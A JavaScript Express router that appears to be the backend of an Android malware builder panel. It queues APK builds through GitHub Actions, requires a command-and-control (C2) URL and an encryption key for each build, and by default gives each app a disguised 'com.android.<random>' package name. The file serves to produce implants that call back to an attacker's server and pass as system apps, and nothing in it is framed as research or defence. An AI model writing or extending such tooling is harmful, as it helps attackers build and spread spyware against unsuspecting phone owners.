import { Router } from 'express';
import { v4 as uuidv4 } from 'uuid';
import { authMiddleware } from './auth.js';
import { generateBuildId, log } from '../utils.js';
import { triggerBuild } from '../services/apkBuilder.js';
import { encryptPayload } from '../services/payloadEncryptor.js';

export function createBuildsRouter(db, config) {
  const router = Router();
  const requireAuth = authMiddleware(db, config);

  router.use(requireAuth);

  // GET /api/builds — list recent builds
  router.get('/', (req, res) => {
    const builds = db.stmts.getBuilds.all();
    res.json({ builds });
  });

  // GET /api/builds/:id — get build details
  router.get('/:id', (req, res) => {
    const build = db.stmts.getBuild.get(req.params.id);
    if (!build) return res.status(404).json({ error: 'Build not found' });
    res.json({ build });
  });

  // POST /api/builds — trigger new APK build
  router.post('/', async (req, res) => {
    const { packageName, iconUrl, buildConfig, c2Url, encryptionKey } = req.body;

    if (!c2Url) {
      return res.status(400).json({ error: 'C2 URL is required' });
    }

    const buildId = generateBuildId();
    const pkg = packageName || `com.android.${uuidv4().slice(0, 8)}`;

    // Validate package name
    if (!/^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/.test(pkg)) {
      return res.status(400).json({ error: 'Invalid package name format' });
    }

    // Insert build record
    db.stmts.insertBuild.run({
      id: buildId,
      status: 'queued',
      packageName: pkg,
      iconUrl: iconUrl || '',
      buildConfig: buildConfig || 'release',
      c2Url,
      encryptionKey: encryptionKey || '',
      requestedBy: req.user.id,
    });

    // Audit
    db.stmts.insertAudit.run({
      id: uuidv4(),
      userId: req.user.id,
      action: 'build',
      targetType: 'build',
      targetId: buildId,
      details: JSON.stringify({ packageName: pkg, buildConfig }),
      ip: req.ip,
    });

    log('info', 'Build triggered', { buildId, packageName: pkg, by: req.user.username });

    // Trigger GitHub Actions workflow (async — don't block response)
    if (config.githubToken && config.githubRepo) {
      triggerBuild(config, {
        buildId,
        packageName: pkg,
        iconUrl,
        buildConfig,
        c2Url,
        encryptionKey,
      }).catch(err => {
        log('error', 'GitHub workflow trigger failed', { error: err.message, buildId });
      });
    }

    res.status(201).json({
      buildId,
      status: 'queued',
      packageName: pkg,
      message: 'Build queued. Check status via GET /api/builds/' + buildId,
    });
  });

  // POST /api/builds/:id/cancel — cancel a queued build
  router.post('/:id/cancel', (req, res) => {
    const build = db.stmts.getBuild.get(req.params.id);
    if (!build) return res.status(404).json({ error: 'Build not found' });
    if (build.status !== 'queued' && build.status !== 'running') {
      return res.status(400).json({ error: 'Build cannot be cancelled' });
    }

    db.stmts.updateBuild.run('failed', null, null, 'Cancelled by operator', new Date().toISOString(), build.id);

    log('info', 'Build cancelled', { buildId: build.id, by: req.user.username });

    res.json({ message: 'Build cancelled' });
  });

  // Webhook endpoint for GitHub Actions to update build status
  router.post('/webhook', (req, res) => {
    const { buildId, status, workflowRunId, apkUrl, error } = req.body;
    if (!buildId) return res.status(400).json({ error: 'buildId required' });

    const build = db.stmts.getBuild.get(buildId);
    if (!build) return res.status(404).json({ error: 'Build not found' });

    db.stmts.updateBuild.run(
      status || 'failed',
      workflowRunId || null,
      apkUrl || null,
      error || null,
      status === 'success' || status === 'failed' ? new Date().toISOString() : null,
      buildId
    );

    log('info', 'Build status update', { buildId, status });

    res.json({ message: 'Updated' });
  });

  return router;
}
